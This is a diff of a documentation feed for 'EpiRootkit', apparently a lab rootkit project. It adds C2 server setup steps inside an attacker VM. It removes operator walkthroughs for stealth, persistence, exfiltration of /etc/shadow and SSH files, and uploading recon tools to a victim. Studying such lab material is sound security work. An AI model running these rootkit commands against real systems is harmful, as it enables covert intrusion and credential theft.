@@ -107,12 +107,17 @@ persist Client-1 install # Manage persistence&lt;/code>
 &lt;li>Session established (1-hour timeout)&lt;/li>
 &lt;li>Rate limiting: 5 attempts/60 seconds&lt;/li>
 &lt;/ol>
-&lt;p>&lt;strong>Default Credentials:&lt;/strong>&lt;/p></description></item><item><title>Installation</title><link>/docs/03-attacking-program/installation/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/installation/</guid><description>&lt;h1 id="installation-guide">Installation Guide &lt;a href="#installation-guide" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Setup instructions for the EpiRootkit C2 server.&lt;/p>
-&lt;h2 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="required-software">Required Software &lt;a href="#required-software" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
-&lt;li>&lt;strong>Node.js&lt;/strong>: Version 18+&lt;/li>
-&lt;li>&lt;strong>pnpm&lt;/strong>: Package manager (recommended)&lt;/li>
+&lt;p>&lt;strong>Default Credentials:&lt;/strong>&lt;/p></description></item><item><title>Installation</title><link>/docs/03-attacking-program/installation/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/installation/</guid><description>&lt;h1 id="c2-server-installation">C2 Server Installation &lt;a href="#c2-server-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>The C2 server runs inside the &lt;strong>attacker VM&lt;/strong> (192.168.200.11), not on the host system.&lt;/p>
+&lt;h2 id="quick-setup">Quick Setup &lt;a href="#quick-setup" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>&lt;strong>Complete attacker VM setup with C2 server:&lt;/strong>
+👉 &lt;strong>&lt;a href="../../02-setup/attacking-vm-setup.md">Attacker VM Setup Guide&lt;/a>&lt;/strong>&lt;/p>
+&lt;p>This covers everything: Node.js installation, project transfer, dependencies, and C2 server launch.&lt;/p>
+&lt;h2 id="vm-only-installation">VM-Only Installation &lt;a href="#vm-only-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>If you already have the attacker VM configured and just need to install the C2 server:&lt;/p>
+&lt;h3 id="prerequisites">Prerequisites &lt;a href="#prerequisites" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
+&lt;li>&lt;strong>Attacker VM running&lt;/strong>: Ubuntu with Node.js 12+&lt;/li>
+&lt;li>&lt;strong>Project files&lt;/strong>: Available in VM (via git, scp, or shared folder)&lt;/li>
+&lt;li>&lt;strong>Network&lt;/strong>: VM can reach port 4444 (victim connections)&lt;/li>
 &lt;/ul>
-&lt;h3 id="verify-installation">Verify Installation &lt;a href="#verify-installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h3 id="installation-steps">Installation Steps &lt;a href="#installation-steps" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -127,39 +132,27 @@ persist Client-1 install # Manage persistence&lt;/code>
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="8582e83" class="language-bash ">
- &lt;code>node --version
-# v18.17.0
+ &lt;pre id="5f5ffd2" class="language-bash ">
+ &lt;code># Inside attacker VM (192.168.200.11)
+cd attacking_program
 
-pnpm --version
-# 8.6.2
-
-# Install pnpm if missing
-npm install -g pnpm&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h2 id="installation">Installation &lt;a href="#installation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="1-install-dependencies">1. Install Dependencies &lt;a href="#1-install-dependencies" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="d47fc10" class="language-bash ">
- &lt;code>cd attacking_program
+# Install dependencies
 pnpm install
-# ✓ Dependencies installed successfully&lt;/code>
+# ✓ Dependencies installed
+
+# Verify configuration
+cat config.env
+# C2_PORT=4444
+# WEB_PORT=3000
+# PASSWORD_HASH=b109f3bbbc...
+
+# Start server
+pnpm start
+# ✓ C2 server started on port 4444
+# ✓ Web interface started on port 3000&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;h3 id="2-review-configuration">2. Review Configuration &lt;a href="#2-review-configuration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+&lt;h2 id="configuration-options">Configuration Options &lt;a href="#configuration-options" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="environment-settings">Environment Settings &lt;a href="#environment-settings" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
 
 
  
@@ -174,11 +167,59 @@ pnpm install
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="531aa43" class="language-bash ">
- &lt;code>cat config.env&lt;/code>
+ &lt;pre id="3b87d42" class="language-bash ">
+ &lt;code># Edit config.env in attacker VM
+C2_PORT=4444 # Port for victim connections
+WEB_PORT=3000 # Web interface port
+ENCRYPTION_KEY=secret32hex # XOR encryption key (32 hex chars)
+ENABLE_ENCRYPTION=true # Enable XOR encryption
+PASSWORD_HASH=hash # SHA-512 authentication hash&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;p>&lt;strong>Default Settings:&lt;/strong>&lt;/p></description></item><item><title>Command Reference</title><link>/docs/03-attacking-program/commands/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/commands/</guid><description>&lt;h1 id="command-reference">Command Reference &lt;a href="#command-reference" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Complete reference for all C2 server commands.&lt;/p>
+&lt;h3 id="change-default-password">Change Default Password &lt;a href="#change-default-password" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="03435fe" class="language-bash ">
+ &lt;code># Generate new SHA-512 hash
+echo -n &amp;#34;newpassword&amp;#34; | sha512sum
+# Copy hash to config.env as PASSWORD_HASH&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h2 id="access-points">Access Points &lt;a href="#access-points" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="cli-interface">CLI Interface &lt;a href="#cli-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
+
+
+ 
+ 
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ &lt;div class="prism-codeblock ">
+ &lt;pre id="600aa1d" class="language-bash ">
+ &lt;code># Direct access in attacker VM
+pnpm start
+# c2-server$ help
+# c2-server$ ls&lt;/code>
+ &lt;/pre>
+ &lt;/div>
+&lt;h3 id="web-interface">Web Interface &lt;a href="#web-interface" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;p>&lt;strong>From any device on the network:&lt;/strong>&lt;/p></description></item><item><title>Command Reference</title><link>/docs/03-attacking-program/commands/</link><pubDate>Sun, 25 May 2025 00:00:00 +0100</pubDate><guid>/docs/03-attacking-program/commands/</guid><description>&lt;h1 id="command-reference">Command Reference &lt;a href="#command-reference" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>Complete reference for all C2 server commands.&lt;/p>
 &lt;h2 id="command-list">Command List &lt;a href="#command-list" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;table>
  &lt;thead>
  &lt;tr>
@@ -542,196 +583,5 @@ unhide_module Client-1
 
 hide_files Client-1
 # SUCCESS: File hiding enabled&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h2 id="real-world-scenarios">Real-World Scenarios &lt;a href="#real-world-scenarios" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="initial-compromise">Initial Compromise &lt;a href="#initial-compromise" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="a73e703" class="language-bash ">
- &lt;code># 1. Gain foothold
-auth Client-1 password
-
-# 2. Reconnaissance
-exec Client-1 id
-exec Client-1 hostname
-exec Client-1 cat /etc/os-release
-
-# 3. Enable stealth
-hide_module Client-1
-hide_files Client-1
-
-# 4. Establish persistence
-persist Client-1 install&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="data-exfiltration">Data Exfiltration &lt;a href="#data-exfiltration" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="50956ae" class="language-bash ">
- &lt;code># System information
-download Client-1 /etc/passwd
-download Client-1 /etc/shadow
-download Client-1 /etc/hosts
-
-# User data
-download Client-1 /home/user/.bash_history
-download Client-1 /home/user/.ssh/known_hosts
-
-# Log files
-download Client-1 /var/log/auth.log
-download Client-1 /var/log/syslog&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="lateral-movement-preparation">Lateral Movement Preparation &lt;a href="#lateral-movement-preparation" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="4ca69d8" class="language-bash ">
- &lt;code># Network reconnaissance
-exec Client-1 ip route show
-exec Client-1 arp -a
-exec Client-1 ss -tulpn
-
-# Upload tools
-upload Client-1 ./tools/nmap /tmp/scanner
-upload Client-1 ./tools/linpeas.sh /tmp/enum.sh
-exec Client-1 chmod &amp;#43;x /tmp/scanner /tmp/enum.sh
-
-# Execute reconnaissance
-exec Client-1 /tmp/enum.sh &amp;gt; /tmp/results.txt
-download Client-1 /tmp/results.txt ./recon/&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="persistence-testing">Persistence Testing &lt;a href="#persistence-testing" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="69651df" class="language-bash ">
- &lt;code># Before reboot
-status Client-1
-persist Client-1 install
-
-# Simulate reboot
-exec Client-1 sudo systemctl reboot
-# Connection lost...
-
-# After victim reboots (auto-reconnect)
-ls
-# • Client-1 - UNAUTHENTICATED - Last seen: Just now
-
-auth Client-1 password
-status Client-1
-# Persistence: ENABLED ✓&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h2 id="error-handling">Error Handling &lt;a href="#error-handling" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="common-issues">Common Issues &lt;a href="#common-issues" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="bc4416d" class="language-bash ">
- &lt;code># Client not found
-auth Client-999 password
-# ERROR: Client not found
-
-# Authentication failed
-auth Client-1 wrongpass
-# ERROR: Authentication failed
-
-# Rate limiting
-auth Client-1 wrong1
-auth Client-1 wrong2
-# ... (after 5 attempts)
-# ERROR: Rate limited. Try again in 60 seconds
-
-# Command on unauthenticated client
-exec Client-1 whoami
-# ERROR: Client not authenticated&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;h3 id="connection-issues">Connection Issues &lt;a href="#connection-issues" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="65ce483" class="language-bash ">
- &lt;code># Check connection status
-keepalive Client-1
-# Failed pings: 3
-# Connection: UNSTABLE
-
-# Client disconnected
-exec Client-1 whoami
-# ERROR: Client disconnected
-
-# Network timeout
-download Client-1 /huge/file.bin
-# ERROR: Network timeout&lt;/code>
  &lt;/pre>
  &lt;/div></description></item></channel></rss>
